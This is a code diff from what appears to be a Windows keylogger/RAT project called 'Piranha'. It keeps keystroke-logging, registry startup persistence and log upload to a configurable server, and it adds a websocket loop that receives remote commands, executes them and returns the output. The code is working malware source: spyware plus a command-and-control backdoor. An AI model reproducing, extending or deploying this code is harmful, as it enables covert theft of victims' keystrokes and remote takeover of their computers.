@@ -7,11 +7,41 @@ from keylogger import keylogger
 from threading import Timer
 import sys
 from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, QueryValueEx
+from Commands import commands
+import websockets as ws
+import asyncio
 
+'''
+                • ⠀⠀▓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀•⠀⠀░⠀⠀⠀⠀⠀•⠀⠀  ◾
+         ▄        ⠀⠀⢠⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ░
+  ▄               ⠀⠀⠀⢻⣿⣿⡿⠛⣉⣠⣤⣤⣤⣤⣀⠀⠀⠀•⠀⠀⠀⠀⠀  ▓
+               ⠀⠀⠀▄⠀⠀⠀⠟⢁⣴⣾⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀░⠀          
+      •    ░  ⣤⡀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣧⠀⠀⠀⠀⠀⠀    •   •
+     ▓        ⢻⣿⣆⠀⠀⠀⢀⣾⣿⣿⡟⢀⣿⣿⣿⣿⣦⣀⣀⣀⣹⣿⣧⣀⠀⠀⠀⠀      ◾
+              ⢸⣿⣿⡆⠀⢠⣿⣿⣿⡟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⡄⠀◾      █
+ •         •  ⢸⣿⠋⣠⣶⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⡀⣴⣿⠹⣷⠀⠀ •
+     ▄        ⢸⣿⠀⠿⠿⢿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⡿⠋⣠⣴⡙⣿⠈⠿⠀⠘⠀⠀  •
+          ▓   ⢸⣿⣷⣦⠀⠈⠻⣿⣿⢿⣾⣿⣿⣿⣿⠋⢀⡈⠃⠈⠁⠀⠀⠀⠀⠀⠀⠀⠈      ▓
+              ⢸⣿⡿⠃⠀⠀⠀⢀⣠⣴⣿⡿⣿⣿⣿⣦⡈⠻⣠⣴⢀⡴⠀⣀⠀⣰⠀⠀             
+     •        ⢸⠟⠁⠀⠠⠴⣾⣿⣿⣿⡿⠀⣾⣿⣿⣿⣿⣦⣈⠁⠾⢇⡼⠿⠞⠛⠀⠀  ░
+ ◾        •   ⠀•⠀⠀⠀⠀⠀⠙⠿⣿⠇⠈⠻⠿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣶⠖⠀⠀⠀    ◾ 
+            ⠀⠀⠀⠀⠀⠀⠀⠀▄⠀⠀⠉⠀•⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀        ⠈ 
+ ▀██▀▀█▄   ██          •    ░        •  ▀██   ⠈        ◾
+  ██   ██ ▄▄▄  ▄▄▄ ▄▄   ▄▄▄▄   ▄▄ ▄▄▄    ██ ▄▄    ▄▄▄•
+  ██▄▄▄█▀  ██   ██▀ ▀▀ ▀▀ ▄██   ██  ██   ██▀ ██  ▀▀ ▄██
+  ██       ██   ██     ▄█▀ ██   ██  ██   ██  ██  ▄█▀ ██
+ ▄██▄     ▄██▄ ▄██▄    ▀█▄▄▀█▀ ▄██▄ ██▄ ▄██▄ ██▄ ▀█▄▄▀█▀
+                                              by uzairrj
+'''
+######################### Configuration ############################
 BASE_URL = "http://127.0.0.1:8000"
 UUID = "312314143312"
 HEART_BEAT = 30
 INTERVAL = 60
+WEBSOCKET_BASE_URL = "ws://127.0.0.1:8000/ws/"
+####################################################################
+# Dont touch below code, if you dont know what you are doing!!
+####################################################################
 
 def addStartup():  # this will add the file to the startup registry key
     fp = os.path.dirname(os.path.realpath(__file__))
@@ -76,6 +106,20 @@ def sendData(logs, logger):
     except req.exceptions.ConnectionError:
         return
 
+async def handleCommands():
+    commandsHandler = commands.Commands()
+    handler = await ws.connect(WEBSOCKET_BASE_URL+"payload/"+UUID+"/")
+    while True:
+        data = await handler.recv()
+        data = json.loads(data)
+        id = data["id"]
+        cmd = data["command"]
+        arg = data["arg"]
+        output = await commandsHandler.run(cmd, arg)
+        res = json.dumps({"id":id, "output":output, "type":"payload"})
+        await handler.send(res)
+        
+
 if __name__ == "__main__":
     logs = {
             "timeStamp":None,
@@ -96,9 +140,10 @@ if __name__ == "__main__":
 
     if not registerServer():
         exit()
+
+    asyncio.run(handleCommands())
     
     if(not checkStartup()):
         addStartup()
-
-
+    
     
